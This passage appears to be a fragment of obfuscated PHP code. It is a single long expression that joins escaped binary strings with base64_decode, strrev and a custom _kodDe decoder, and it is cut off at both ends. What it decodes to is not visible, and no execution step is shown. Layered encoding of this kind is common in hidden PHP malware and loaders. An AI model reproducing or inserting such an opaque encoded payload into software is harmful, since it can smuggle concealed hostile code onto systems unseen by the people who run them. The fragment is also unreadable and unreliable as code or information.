14\157\271\312\263\170\132\327\323\127\134\234\136\372\354\153\263\136\176\266\273\367\224\175\115\337\376\335\131\77\373\344\77\33\17"."\170\367\341\17\277\305\56\211\15\347\226\17\146\370\46\162\205\76\154\144\101\376\144\206\114\151\73\77\330\7\207\116\351\144\257\336\237\131\106\43\240\345\235\71\23\104\252\332\231\160\331\144".base64_decode('+smQog8MZ5LsqLy2DmpMjQwvH2BWmlBkVi1kTp0J1U6vAwXdskzvUJHdV7O1vsJwGpo7rQ==')."\6\16\201\117\256\1\313\242\351\254\11\53\6\265\341\336\74\350\40\241\242\244\225\53\144\207\330\211\141\256\150\45\227\301\361\365\124\126\321\114\370\35\111\232\151\273\27\162\147\115\205\46".base64_decode('FbOFofQA7NVygyMDehqk9pk1AJJJD/WPDEPfZtRBdVrKKurpDGtaVh8aASF2au1M+MgsGA==').base64_decode('gBliJMDmceoMqGb6LPjKtOknQ8droW+1U2eylFmsg9rgcAFO36fB+NSyXMvMF7NJaNGQ1g==')."\127\134\156\302\240\316\234\16\40\175\332\262\334\200\71\310\132\5\37\232\171\62\4\12\53\106\122\103\354\56\320\210\225\265\7\122\14\161\246\103\303\247\161\314\250\201\326\365\347\127\144\227".strrev('XV–áTµI‘ƒO¦ËlÎ-°òÔXõ¦4*c6Z'."\0".'w®|òÌà2ø4,˜tíum1')."\x3e\xb2\x62\x0\x60\x67\xcd\x98\xce\xa6\x73\x6\x43\x1f\x86\x35\xb3\x20\x60\x9b\x3\xc5\xfc\xb2\xe5\xec\x93\x6c\xd0\xd8\xfc\x67\x7\x47\x86\x73\x4c\x57\x9f\x5b\x36\x92\xec\xcf\x0\x6c\xdf\x48\x7e\xd8\x4a\x1"."\272\115\143\210\236\321\255\221\41\166\114\260\42\275\334\354\65\230\66\271\220\32\131\66\264\202\355\111\140\164\206\314\154\161\160\0\122\255\314\262\276\221\54\174\254\230\132\276\254\240\263\23"."\xb2\x91\x64\x3a\xbf\x1c\xf4\xb2\x45\xa3\xd0\x9f\xb7\x61\xb8\x4e\x66\x28\x73\xf2\x54\x18\x2e\x63\x68\x79\x41\x37\x61\xc1\xae\x58\x9e\xcc\xf5\x6b\xd0\x84\x91\x54\xb2\x77\xd9\x0\x33\x2d\x2a\x8c\x24\x33\x59\x98"."\x1\x33\x97\x1c\x1a\xee\x3\x4\x9d\x39\xd\x46\xcb\xec\x1f\xd0\x56\x30\x9d\xf1\xb2\xa1\xa4\x55\x1c\x1\xe4\x9f\xc5\x40\xa6\x31\x64\x9e\x39\x6b\x3a\x9b\x20\x68\xc7\x50\xc6\x1a\x2c\xe4\x96\x33\x42\x1\xcd\xd4".strrev(''."\0".'<<õ €4Ñk'."\0".'ÈğÿV“åÀ6!‹3sc­êÁˆßz“ËX„ŒáĞeÍ{çh»LıšW')."\x44\xa4\x90\xb6\xad\xfe\xe2\xa\xb6\x24\x60\xb6\x8c\x3e\x2b\x9b\x63\xd6\xa7\xb5\x33\xa0\xa0\x91\x32\x6d\x7d\x64\x88\xcd\x2c\x60\xac\x3d\x94\x1d\xce\xe7\x60\x3e\xd8\x9a\xaa\xad\x85\xaf\x36\x6a\xa9\x1\xa6\xc7"."\xe5\xb6\xa2\xb2\x91\x25\x35\xbf\xa2\xa\x33\xf9\xe0\x83\xdd\xba\x33\x72\xbe\xac\x96\xe3\xa6\x2f\xad\xd0\x7d\x39\x6d\x40\xd7\x99\x9d\x76\x92\x21\x2f\x37\xa7\x0\xfb\x4e\x48\x37\xb2\xba\xd0\x4d\xd3\x13\x0\x56"."\122\154\266\261\246\103\62\310\300\321\270\134\113\52\147\113\331\50\346\310\215\313\246\344\320\73\334\102\237\334\353\45\131\146\34\133\346\44\21\364\261\226\65\144\26\140\304\6\314\164\52\143"."\26\323\216\132\323\111\137\231\221\244\75\51\227\323\353\116\347\146\73\242\102\207\311\64\113\163\214\132\222\314\50\267\21\302\177\30\172\222\133\256\26\266\1\346\327\235\50\264\217\115\114\122"."\x42\x7\xaa\x5a\xb7\x35\x6b\xc0\x27\x27\x7b\xe5\x5c\x23\x87\xda\x9b\xc9\xf8\x9c\xf7\x9e\xf1\x5\xe4\xce\xe\x35\x11\x88\x2f\x90\x6c\xef\xf0\x5\x59\x86\x3b\xaa\xb0\x87\x97\xfa\x21\x26\x4d\x1a\x41\x79\xee\x9c".base64_decode('fWa4sW/bo6MbL99z2fY9G+4afeTSfXdtH915GYrufuii0buufeeqtbsf2rD7obP2rbvvgw==')."\35\27\216\156\334\266\357\207\73\107\67\337\66\172\323\272\335\217\356\334\367\370\272\275\267\255\337\375\320\326\75\233\317\37\135\373\300\356\107\57\37\75\357\272\321\165\33\367\134\272\141\367"."\316\315\10\176\317\171\242\146\4\66\272\365\112\134\166\307\232\321\207\36\332\167\375\155\74\367\203\35\147\3\341\202\225\326\242\333\112\374\324\10\63\250\42\10\251\314\125\0\25\165\313\247"."\x74\x64\x74\x34\x62\xa\xb9\x6b\x8b\xad\xaf\xec\x7e\xbd\xa0\xd8\xc4\xa\x4b\x43\x7f\x73\x66\xce\x4b\x51\x8d\xde\xd9\xb6\x14\x23\x87\xb3\x15\x36\xd6\x3e\x8e\x8e\x9\x3d\x9b\xc7\x48\x5\xa3\xe4\xa7\xd7\x22\x1d"."\206\367\22\346\225\33\146\232\121\6\217\360\130\213\271\252\302\101\70\120\303\152\73\245\127\103\11\351\172\245\27\25\123\330\305\37\305\66\131\70\73\302\47\335\205\376\145\247\225\67\203\115".base64_decode('LSPthimUutAw6UYFPTEpQSmynpzEwLHSnGREznKOBGhdyeG/R6FN8SjkyFdx3gHGh/mM6Q==').base64_decode('ymtGbn5Bz2f42Q9WXJYdRFcX4mWGi3fCkYnWY9EuAyiPqqzNNcxgBpEycRZJjt1Fc2lUaA==')."\221\321\207\70\45\54\350\151\203\231\5\353\131\2\11\24\320\47\235\341\320\113\62\334\66\71\205\320\276\340\70\236\232\63\57\337\237\307\156\37\354\331\363\340\166\66\273\55\45\265\1\302"."\xe2\xd2\x8f\x9c\x9a\x71\x1f\x79\xf1\x45\xd2\xd4\x28\x39\x5f\xc0\x60\xf5\x5e\xaf\x57\x52\xcd\xa\xdb\x30\x1c\x82\xea\xc4\xc9\x2f\x4a\xb\xe1\x15\x3c\x56\x7a\x13\x37\x88\x40\x4b\xbb\xaf\x4f\xb7\xec\x7a\x72\x7f"."\122\231\242\240\206\316\362\325\242\0\131\4\323\175\63\121\220\214\30\54\334\156\30\305\242\305\156\262\114\362\115\3\11\320\232\15\326\34\263\11\375\150\220\232\17\351\242\124\61\227\141\251"."\x28\x88\x40\x62\xc5\x1c\x9e\xed\x7a\x67\x9f\xf5\x5c\x5a\x2a\x34\x5b\x4b\xd9\x52\xad\x6a\x2f\xc\xaa\x4f\x8c\x87\x36\x45\xe4\xeb\x69\xb8\x11\xe6\x97\x46\x69\x8\x0\x58\xd9\x36\x27\xe\xa0\xfe\x7b\x39\x5a\xa0".base64_decode('6bVRCyxiWQpcA6q0pOvmMYFRuDgZri8pastTnk+ZuRw3KbUyGjs6tPDVjJzO8a9oCYN67g==')."\125\201\306\261\71\266\212\70\271\45\160\127\115\33\0\34\11\67\252\115\341\30\137\147\66\273\223\34\350\10\253\361\170\124\162\272\100\256\260\56\126\27\104\233\324\140\64\272\40\14\370\7".strrev('~í±TE€­_¾éõÛqˆØ=‰E`+o0#®ÀâY0ëdX‡=¸˜ãNk|E‘/^#').base64_decode('A7vlHU8EYmUciFDHIjAb4EwECrRGFynBaKSzrT1O/WbQ9PaolE8slCGbuRcpzYbqQx2RQA==')."\x30\xa4\x84\xdb\x13\x51\x76\xf7\x80\x1b\x89\x92\x5b\x27\x71\x1e\x67\x43\x50\xb0\x74\xee\x3e\x4\xca\xd3\x88\x7c\x33\x46\xae\x91\xd7\x4\xf8\xdb\xe5\xa9\xec\xae\xe8\x9e\xdc\x5d\xd5\x5d\xbd\xd4\xd7\x6d\xf5\xf8"."\45\106\145\310\323\3\221\216\46\350\136\75\17\245\55\130\271\155\161\304\341\151\60\32\13\4\43\254\51\215\201\70\4\243\301\60\15\354\335\164\367\356\107\56\332\373\343\273\106\317\337\200"."\x2a\xda\x73\xf5\x9a\x3d\x57\x3c\x80\xe4\x12\x2c\x8b\xdc\x75\xe1\xde\xc7\x2e\xda\xb3\x69\xdb\x9e\xb\x41\x86\x50\xf6\x6d\x7b\x70\xf7\xce\xc7\xf7\x6e\xba\x6d\xf4\xae\x2b\xf7\x5c\xfe\xf0\xde\xab\xcf\xa1\x19\xef"."\xdc\x7e\xf7\xe8\x5\xb7\xf1\x86\x29\xef\x5c\xfa\xd8\x9e\x8b\x6e\xe6\xf2\x9\x15\x4b\x3c\xa8\xf4\x3b\x6b\x37\xec\xdd\x79\x17\x96\x4e\x6e\x3c\x6b\xcf\xfd\xeb\xf7\x6c\xde\x30\x7a\xc1\xf5\xa3\x57\xdd\xb6\xf7\xa2"._kodDe('L5Jc6ybjX/zLpeolTHywIze0zfGV3R0+6Qa22J5l30JKv9+SRRnOkmvs8LIhUVtqm1ZZLJc=')."\30\162\137\15\222\243\340\173\145\62\305\20\152\270\2\2\251\5\276\133\130\234\170\100\150\250\34\263\25\253\140\376\245\106\111\215\151\12\305\203\261\160\143\10\154\346\371\104\115\42\302\24"."\x98\x2d\xa0\xd4\x78\x6c\x21\xf\xf3\x4b\x8f\x25\xbe\x72\x94\x2a\x86\xcc\xd5\x8a\xa3\x23\x9a\x2f\x65\x66\x8a\xd9\x1c\x69\xac\x52\x81\xad\xa8\x2a\x3c\x98\xf9\x90\x7b\x4a\x4a\x5\x66\xa4\x28\x41\xc7\x57\xb5\xab"."\260\177\12\142\163\133\271\244\322\123\343\251\255\126\300\221\16\55\1\356\163\224\12\60\335\346\345\34\37\361\44\35\261\132\117\115\265\122\221\37\250\200\166\211\161\105\255\127\51\244\245\150"."\236\52\150\260\334\134\1\213\110\247\145\27\64\43\147\133\112\312\303\223\170\171\364\353\160\211\223\362\211\22\164\236\20\204\73\115\11\264\67\71\41\251\47\235\216\112\142\362\230\362\331\334"."\xd1\x5\x9b\xe6\xca\x6a\x25\x9\x37\x11\xca\x64\x92\x62\x8e\xc1\x68\x70\xc\x46\xd5\x14\xa0\x13\x1d\x2d\x7c\xbe\xe9\x35\x3\x85\x5e\x3f\xa3\xcd\xd2\x2c\x36\x51\x90\x4a\xa6\xa\xa7\xd2\xd9\x62\xb0\x26\xea\x6"."\x9a\x1c\xa\x8f\x2\x3c\x7\x1b\xe4\xf3\x9a\x10\x39\xe2\x19\x6c\x6\x71\x3a\x9f\xc4\x32\x79\xc4\xc5\x51\x5\x15\xf8\x68\x3f\xb3\x56\x1f\x23\x75\x70\x21\xbb\x6d\x9\xef\x3\xc3\x65\x85\x49\x21\xdc\x41\x12\xbe"."\110\27\112\4\133\51\226\307\45\64\117\47\47\71\20\125\14\247\342\100\21\276\153\0\70\272\134\60\101\30\117\340\302\355\315\321\130\33\275\100\26\17\266\206\332\2\76\40\342\24\23\50".base64_decode('PBaxlAalElM+mlTpGH7yITZkCfJVtK5UG8lLdBTyfdAYmH2F3CzXSJGGSuoABKrknryisQ==')."\204\212\6\0\310\263\104\165\53\45\156\41\331\147\343\353\120\203\114\334\357\105\2\220\311\134\231\244\223\314\341\27\252\34\327\31\214\266\67\207\331\135\271\46\330\34\347\323\246\3\250\51"."\x16\xc6\xbe\x1d\xe0\xfb\xa\xab\x4a\xba\xa1\x88\x22\xc2\x48\x2\x45\xf2\x43\x69\x1e\x16\xd7\xe5\x71\x6\xe7\xf9\x28\x22\x58\x3e\x8a\x70\x66\x83\xa1\x24\xcf\x64\xf8\xfb\xf1\x76\x1e\x16\x32\x2e\x8a\x74\xc6\xd9".strrev('ç“|«­F*%ˆX?lïmCz4ğ^¯Ä[<âÚˆ)1¢3ŒÙ¿+pñ5}L	U')."\125\167\323\133\155\64\110\177\116\141\61\174\323\247\147\145\255\107\231\261\272\32\140\270\217\4\273\337\310\61\41\23\177\345\324\210\32\211\266\320\70\361\230\26\312\245\305\226\104\351\122\220".base64_decode('xJsQEq/FWBdfDQrCYYXekVXao4sCwgmXlAEpwieX//Su7qFuHxIWrKXillpTo8LEEOIeAw==')."\166\370\120\72\300\330\350\122\17\160\14\65\143\366\161\101\261\275\211\211\13\364\167\61\13\20\132\11\5\320\176\66\237\141\327\325\350\75\71\265\173\125\367\111\335\136\37\275\32\210\205\227".base64_decode('bo9okhpajHhsPO6416gSN01QO+olhOiqpZE58AObrjkgnkJ0bgOfzNCpq9rR35bEqhD6Gw==')."\101\77\221\4\232\56\203\3\240\45\31\11\57\10\255\302\377\210\214\152\76\220\364\6\220\263\100\270\175\25\372\27\21\230\125\341\166\167\145\215\241\304\242\120\210\2\260\60\374\12\120\104"."\x70\xa0\xab\x92\x47\x3d\x6c\x8e\xf\xd9\xc2\x3c\x1f\xaa\x56\xd5\x2a\x32\x98\xde\x9e\x29\xd5\xaa\xea\xb7\x3a\x1\x5f\xb8\x13\x88\xaa\xca\x89\xb5\x95\xc0\x43\x2\xf1\xa0\xa0\xbe\xe\x84\x28\xc5\x5\x62\x3c\xef"."\104\4\356\47\16\342\55\261\150\147\207\24\157\15\54\14\267\267\260\230\177\62\13\115\206\252\225\246\160\34\15\121\220\41\243\160\137\47\307\101\340\44\142\221\54\365\72\120\272\11\121\166"."\24\221\104\166\274\31\240\224\331\271\312\32\73\303\221\46\371\16\67\6\4\206\102\250\72\360\224\111\254\161\54\116\156\163\263\10\36\162\26\46\350\306\42\144\14\130\204\16\0\213\221\341"."\x62\x11\xe2\x26\x8f\x45\x48\x47\x59\x4\xef\x4e\x42\xed\x2c\xf\x6d\xe\xd1\xc6\x8e\xed\xf8\xfa\xb5\x41\x7e\x17\x71\x76\x3a\x29\x79\x88\xc0\x34\xd8\x47\x95\x62\xd8\x4f\x8\xda\x4d\x6a\x5c\x1\xea\xd2\x63\x12"."\25\224\264\343\247\6\165\212\164\27\32\53\104\45\265\221\237\102\40\341\223\300\240\337\356\245\363\210\160\274\224\341\51\275\206\153\47\14\73\343\370\50\134\327\103\37\15\223\73\222\322\147"."\331\175\6\242\377\123\115\111\373\114\370\266\234\40\64\116\124\125\15\312\132\241\320\301\166\205\104\215\113\243\316\35\25\47\123\113\371\106\11\134\1\172\340\27\132\364\165\372\323\15\121\246".base64_decode('vOiGj1R6gOl2M4G9q3u4psaL/pmF/jaiv0H0N4QTmruHZzajwMnNPX44UGHXIZyuDLu7Kw==')."\xc6\x1a\x64\x0\x60\x43\xd\xd1\xa\x1a\x65\xa5\xc\xce\x39\x53\xfd\xd8\x71\x89\x6a\x67\x99\x62\x9c\x6c\xf1\x84\x46\x9a\xea\xc6\x45\xbc\x29\x16\xed\xa0\x72\x8c\x12\x6e\x56\xa8\x73\x4\xa5\x92\x6a\xd3\x2b\x41"."\100\13\306\102\170\215\121\50\226\127\125\351\320\146\315\255\124\340\302\164\265\263\124\270\275\51\264\130\251\64\322\303\252\246\251\120\130\101\53\232\125\244\224\324\304\152\240\155\205\323\35\253"."\xdf\x1c\x52\x64\x24\x65\xbb\xee\x20\x4d\x4b\x8\xc4\x2d\x11\xf0\x88\x9b\x3\x76\x39\xd5\x3\x5b\x7b\x9e\x43\xe5\x6a\x9a\x15\x8e\x23\xb6\x1f\x89\x90\x9e\xa2\x2c\xc3\xc2\xe2\xb0\x47\xe1\xde\x8\x70\x22\xde\xc2"."\120\315\50\124\304\62\150\105\64\53\264\70\21\13\340\104\42\303\36\72\36\375\41\144\11\357\261\12\131\215\336\330\44\222\237\157\51\250\32\226\72\4\115\52\202\142\121\23\360\216\60\116"."\xa9\x4f\x3c\x87\xe8\x1b\xe8\x30\xcb\xda\x88\x5\x20\xbb\xd3\x58\x47\x2c\xdc\x16\x88\x2d\x81\x21\x13\x3b\x9\x58\xb8\x66\xc6\x71\x6f\x57\x44\xc\xab\x53\xba\x39\xde\x8e\x5a\x2d\xdf\x24\xa7\x73\xcc\xe9\x34\xda".strrev('Şp•Úù\\äVa÷'."\0".'ÖbcÅÂ"Êè¦%¥È`¶±TÅS0büª£|iæxƒCZ:3')."\x8a\x59\x2d\x9e\x64\xc6\x33\x9a\x3\x9d\x11\x39\x5\x86\x4a\x59\x10\x5a\xf2\x25\x6b\x84\xb5\xb4\xdc\x1a\x61\x79\x4c\xa9\xc3\x57\x1b\xf4\xa7\x6a\x3a\xf4\x8f\xfa\x8c\xa8\xaa\x43\x3b\xdb\x62\xe\x7b\x43\xe1\x9e"."\27\241\125\300\241\73\23\121\25\161\241\130\10\363\4\350\21\37\126\251\275\322\356\135\236\24\250\6\3\160\117\270\137\322\65\6\123\256\153\274\74\327\137\205\332\133\302\355\241\206\266\221"."\160\74\320\246\260\206\203\206\16\373\133\234\5\365\204\243\152\4\111\326\252\254\204\13\107\101\107\354\160\346\247\252\302\341\210\117\23\46\332\166\241\50\271\105\63\114\142\16\335\306\157\116".base64_decode('EPtthBAB4W+A67FJXjGJS8tMD8q7fGYaZj3OwcBU1pktwFXHx932z3KyMM0WB73sLJm7VQ==')."\x83\x2\x9d\x92\xbf\x0\x5c\x58\x61\x1f\x24\x7\x3e\x39\x67\xf3\x10\x9b\xcd\x30\xf\x47\xaa\x2e\x7a\x93\xd5\x2d\x8b\x1f\xf8\x26\xfa\x75\xc5\xca\xeb\x29\xe2\xa4\x51\x1\xb7\x62\x4a\xda\xd4\x2d\xe1\x7b\x1a\xc6"."\236\354\266\130\320\356\27\236\25\144\357\246\115\215\154\220\213\71\73\256\147\100\177\337\224\44\66\360\342\266\232\270\35\44\331\306\223\143\30\61\163\324\137\233\253\40\324\24\346\103\43\101"."\211\304\210\160\147\212\117\75\104\235\75\114\147\40\306\143\205\301\230\240\373\234\220\67\62\147\166\350\205\254\101\216\172\26\211\223\34\340\63\250\2\72\377\76\305\125\116\36\165\174\74\130".base64_decode('Aok9SHzZHDLnVqRl0lVFHAVcwWed0gWQYg59xCtfKUK4QxKlSwzMuR2NzQRzCoSfEOiDFA==')."\xf6\x5b\x60\x39\x3e\xe1\x71\x86\xd4\x89\xa5\x2a\xaf\xf0\x0\x91\xd6\xe4\xdb\x9b\x92\xf7\xf2\x9\x32\xa6\x90\x29\x17\xb8\xdd\x6b\xc8\xee\x20\x7c\xc2\x23\x2c\x5f\x2e\xa7\xf0\x89\xc2\xb7\x9a\xe1\xc0\x1d\xb\xec"."\xbd\xaa\xd4\x96\xe\xe\x2f\xfc\x40\xd2\xd1\x90\xa6\x81\x24\xd0\x20\x59\xe0\x4a\xbd\x68\x44\xab\x81\xf1\x7f\x44\xc2\x1d\x29\xb5\x8d\x79\x47\x2\x7f\xb4\x11\xb3\x8f\xd3\x26\x24\xb8\x82\x5f\x2c\x7\x7d\xa\x47".base64_decode('oaxPx1ea6AWTEHflhwpSv2dfXahTcsk7BkkpWy4IgPyDBaJ0+uoPxnTB9VExcoPsKwsJEg==')."\113\276\104\12\111\144\331\125\206\240\43\275\355\2\63\337\17\331\2\307\20\57\150\217\252\255\210\335\104\231\120\142\130\11\7\171\147\245\200\204\220\123\50\77\271\217\13\33\307\331\304\240"."\200\36\161\302\144\257\104\224\233\207\230\71\10\70\333\22\302\100\200\376\54\311\246\275\250\341\200\165\151\335\346\276\216\60\25\144\367\30\161\233\245\333\314\131\116\140\207\44\377\233\332\240".strrev('á˜×2l¥ dİc	NèXÚãğ—–İcØÆv||DĞs´¥t'."\r".'%‰Lµ1Œ/').base64_decode('dLI1VWNRrFoMRZpdBeKt3HerM02NhNsXlM1AokmbVIQmhhOhNneas4Z4KBBjzoVxvDESDQ==')."\112\331\341\150\351\110\160\331\207\47\122\305\44\115\364\237\136\325\275\222\354\212\352\321\346\50\275\12\153\60\274\152\317\224\352\171\335\253\253\253\272\375\363\174\223\271\342\215\222\53\351\266"."\354\30\311\26\143\76\365\356\4\314\267\130\42\55\6\61\277\317\7\37\341\1\177\267\237\71\324\362\213\114\370\25\360\47\272\170\14\70\363\216\123\357\104\216\206\272\234\170\260\353\362\76"."\xf7\xad\x2e\x95\x5d\xe5\x62\x94\x55\xeb\x65\x86\x4\x61\x7a\x8a\xab\xc6\x97\xc4\xf9\x5c\x39\xd3\x1c\x18\x49\x71\x5a\xb6\xa7\x70\x1\xa3\xbf\x1d\x32\x28\x36\xd5\x29\xb\xe8\x40\x69\xc7\x2d\x65\x39\xc9\x67\x98"."\x62\xb5\x88\x65\x9d\x36\x53\x45\xec\xf\x49\xcc\x91\xb8\xd3\x8c\x92\x7c\x8e\x2a\x10\x41\x1f\x10\xda\x1\x58\x95\x71\xb6\x7a\x73\x88\x57\x2\x33\xe\x22\xa9\xb5\xa5\x35\x3c\x7f\x41\xa4\xad\x3d\xda\x71\x6a\x2c"."\236\350\134\270\150\361\22\360\6\131\317\220\246\127\361\62\135\10\270\74\365\17\152\5\377\40\163\344\276\20\157\72\164\313\57\13\163\74\21\365\21\73\244\145\56\312\250\12\203\347\142\352"."\341\57\237\105\153\363\147\163\166\355\30\20\35\5\75\151\232\366\30\271\13\333\276\274\142\310\354\352\266\172\70\226\246\365\101\10\12\133\67\113\154\265\100\310\360\312\16\345\61\266\312\362".strrev('•Gn“_—=dõ{³ÕàcÅˆâî}À¿l_K’CšX]Ñ¦$»‘"É ®<A ’é:b')."\313\275\332\200\43\137\370\373\135\356\105\273\124\107\334\345\254\362\44\302\12\332\314\276\102\235\337\306\15\316\41\366\1\55\0\201\102\136\55\204\245\160\313\40\314\270\132\135\153\225\47\162"."\57\30\161\142\41\131\257\114\3\117\355\315\110\364\116\53\135\124\232\6\315\77\226\304\210\263\161\32\365\50\302\37\62\323\331\72\35\35\263\345\102\74\334\10\21\75\45\373\100\140\304\67".base64_decode('OyBMzbID3Dwk5RA+MJ9vlizShHwBTyqgvMYRZk0Ll0IbR2LSkzYO/xPyIxRaPh/sx31wrA==')."\141\107\122\112\216\60\122\332\213\215\133\144\43\31\247\327\145\224\335\104\205\275\64\207\267\104\210\143\122\257\204\143\45\65\40\301\60\27\142\367\340\113\162\221\24\151\210\354\57\157\113\33"."\31\146\16\14\33\11\130\44\214\205\130\154\161\236\64\354\65\55\313\233\57\230\330\26\256\301\310\366\371\255\41\310\313\150\226\275\320\341\37\350\53\235\56\143\67\30\155\134\254\206\46\14"."\x7b\x9\x76\xb3\x8f\x40\x51\x9c\xe4\x2f\x90\xa7\x5a\x3c\x43\xc0\x46\x3c\xc4\x81\xa5\x5a\xc3\x10\xc7\x8f\xda\xe6\xc7\xfe\xd\x89\xfc\xcb\x4d\xd8\xa2\x71\x76\x5c\xe4\xec\x3d\x7d\xf6\x48\xda\x91\x83\x8b\x35\xee".strrev('4£É?+3Éh'."\n".'cñ¤~KÁïËšN´ì3²ö\'P¦Oc™ˆ+Ø}ã-ÜC†Ÿ–©Š¾!»˜h').base64_decode('Egz7+DQSH7my20M85N6s4w0FOkFOP82Wrg8wq8QO7mvZ3QmMB4LmFLijbXos7C2b4JUsEA==')."\351\212\223\74\356\343\206\200\246\240\237\372\362\207\236\320\237\323\312\365\313\133\20\276\257\321\274\321\227\1\26\350\43\314\235\264\213\20\272\74\120\167\267\164\267\165\47\344\201\260\13\132"."\157\57\152\254\344\352\324\321\26\341\360\32\360\214\274\224\301\206\140\154\167\331\160\346\161\122\131\157\333\220\31\243\175\17\342\375\331\60\176\302\100\370\332\354\214\105\34\7\131\0\312\172".base64_decode('uaLfG2SWYmYxkyZ7XvQpM4O2++JIe88V1+2597J9j1+756Kbdz/06J7Nj9B0OmpNeo5jxQ==')."\x9e\xf5\x3f\xda\xfb\xe8\x35\xfb\xee\x7a\xfc\x9d\x2b\xee\xfa\x60\xc7\x85\xfb\xb6\x3d\x88\x4d\x96\x7e\x72\x33\xb5\x60\x1a\xdd\xb8\x66\xcf\x65\xdb\x47\x37\x5e\xb0\xef\xfe\x73\xf6\x3c\x72\xf1\x9e\x6b\x7e\xf8\xce"."\125\27\277\175\326\32\130\127\71\342\364\63\120\350\53\212\161\242\105\366\134\267\143\164\307\306\167\66\135\265\157\333\66\11\336\306\6\165\31\151\141\241\231\34\75\167\355\73\77\274\155\164"."\343\45\173\67\375\244\244\0\375\200\173\256\161\367\56\73\157\357\325\347\110\71\356\102\215\304\41\266\330\350\363\62\64\143\364\342\15\173\157\335\356\56\104\135\272\227\51\264\347\362\165\273"."\37\175\300\125\250\335\214\27\123\375\215\222\347\355\75\27\256\33\275\353\152\376\221\335\17\155\240\6\353\256\42\334\204\216\303\323\372\113\341\343\14\253\233\114\335\102\334\266\115\263\123\260"."\304\367\156\175\14\265\207\216\230\74\163\243\333\316\335\173\335\331\173\267\236\17\63\161\345\266\321\213\157\331\263\365\306\275\327\337\305\253\5\254\162\230\354\342\12\356\136\263\357\201\265\173"."\256\170\200\3\342\145\237\126\4\14\301\50\12\203\215\363\311\7\367\356\274\144\357\243\233\61\222\134\260\146\357\232\207\107\67\157\37\275\346\54\376\331\321\207\36\22\243\34\365\223\7\247"."\xca\x90\xe2\x53\x71\x3a\x10\xe3\x5e\x61\xd5\x9d\x2f\x4a\x2f\xb3\xc9\xe4\xf\x4b\x70\xfc\x9d\x2a\xac\xca\xa2\xde\xf7\x99\x60\x46\x1c\xe5\xc3\x6b\x2d\xd\x6c\xd1\xa2\x71\xcc\x35\x9a\x69\x18\xfb\x95\x15\x88\xb0".base64_decode('VtRXTKxCv9UVngq8TSFxTFpxAmlHRf3EKhKoBndFK4CrSI6LxcIDBe88RD2kA9B5hElhFg==')."\130\347\257\363\63\266\70\157\71\376\242\170\143\311\355\73\176\130\325\262\53\330\221\234\52\373\107\7\317\353\100\130\344\234\126\336\22\346\71\275\255\11\252\137\354\15\264\235\346\25\76\304"."\347\314\33\316\146\24\120\103\64\124\326\372\152\52\25\366\6\127\103\145\147\242\331\73\253\162\336\334\103\347\4\211\71\204\255\267\141\173\6\254\44\243\332\241\271\160\76\71\7\363\15\36"."\xf1\x3b\x63\x63\x95\x5\x12\x9b\xd5\x56\x98\x39\x6d\xc8\x42\xc\x37\xeb\x63\x77\xe2\x3a\x39\x53\x16\xee\xfc\x29\x7b\xa6\xef\x83\xb0\xc3\xe2\x76\xdd\x1e\x32\xb\xb2\x79\x78\x1d\xbb\xa5\xd7\x2f\x31\xd7\xac\x5"."\x5c\x8c\x7a\xc8\x17\x4a\x42\x58\x81\xd4\x34\xf3\xe2\xd\xa5\x6b\xf\xa\x24\xa9\x1\xb6\x3\xfc\xc1\x7b\x46\xd7\xde\xfb\xce\x15\x5b\xdd\xb0\x54\xb\x5\xb0\x58\x96\x2d\x79\x51\x91\x5e\x6c\x19\xbd\xe4\xca\xd2"."\357\21\170\347\327\30\360\350\331\233\367\156\162\101\62\173\144\105\122\67\212\2\204\10\270\310\51\147\221\162\21\272\354\377\67\304\204\52\177\353\361\61\10\303\264\316\374\110\61\347\305\352".base64_decode('QG9c9u/pemqnxgmPFXpOeFmoSgkRJCuC9AmgekV+pEtyU06UxZTHMwsxSMPyFksSslevuA==')."\xc6\x83\x45\x28\xd5\x29\x42\x9d\xe2\x6a\x2f\xc6\x6a\x2f\xda\xf\x61\x52\x83\xe8\x97\x6d\x48\x8f\xb\xc8\x20\xce\x57\x9f\xdc\x6f\x41\xb9\x47\x81\x14\xc1\xeb\xc8\x2b\xbf\x43\x35\x8c\xf6\xb5\x38\x1b\xbf\x2c\xe2".base64_decode('xUvJa6THyhH0s2xTU7Aqy4F0Fo20+5PEkslbLLIPlq1U3nUzANKJMK9PfqMCKye9/MjV/Q==')."\x4\x86\xd0\x54\x68\xa5\xcf\x77\x20\x3a\xa9\xd4\x4d\xad\x9f\x7e\x72\x3d\xbb\x32\x7a\x12\x33\xc4\x2a\xe6\xd9\xad\xa\x14\x64\xcf\x7b\x4c\xf0\xf7\x32\x92\x2b\x5e\x70\x62\x7d\xc3\x13\x2e\x3d\x84\xe2\x48\x16\xc3"."\310\211\51\243\325\16\70\321\132\307\33\144\320\121\252\50\223\136\156\41\7\145\224\104\141\363\104\225\277\160\123\206\151\245\365\101\46\176\202\230\56\275\3\311\47\244\217\5\12\34\136\23"."\113\44\231\31\20\75\41\364\5\60\174\0\65\324\24\333\112\42\266\113\224\41\325\137\314\15\64\110\231\212\155\232\112\126\313\215\300\256\175\222\125\77\311\232\215\77\324\200\257\316\130\223"."\330\143\106\302\311\65\146\331\302\175\51\165\276\5\71\364\130\320\207\37\46\363\141\171\40\126\224\37\326\104\214\337\145\215\42\277\105\333\101\70\1\210\10\364\325\50\310\210\164\266\204\333"."\45\103\113\51\101\15\66\265\253\201\216\216\262\31\60\131\124\237\217\255\224\174\313\244\307\53\201\237\241\135\255\222\302\327\265\32\52\160\152\205\142\25\122\314\33\170\205\37\270\32\1\20"."\42\344\34\3\212\124\342\42\112\57\352\223\227\204\150\166\345\334\71\176\3\112\372\374\47\142\312\356\307\26\213\271\223\360\74\313\6\124\44\265\131\270\70\123\224\71\232\102\107\264\241\222"."\x9c\x4e\x55\x2a\xfd\x48\x8\xe2\xe6\xda\x73\xdd\x85\xf9\x43\x63\x73\xfc\x9a\x9c\x89\xd7\x58\xcc\x64\x5b\x6f\xae\xf6\x18\xe4\x1e\x3d\xcb\x1e\x4c\x6\xa4\x27\x2\xc8\x9b\x40\x41\x2d\xb7\xb0\xb4\x8\xae\xdc\x97"."\222\263\272\350\125\275\36\171\372\310\45\271\322\322\176\242\207\363\13\175\217\112\37\345\54\177\254\313\117\63\313\40\6\66\75\102\250\317\154\76\264\324\0\106\76\301\51\240\31\220\321\201".strrev('ŸœòÄ4‰¢Öw 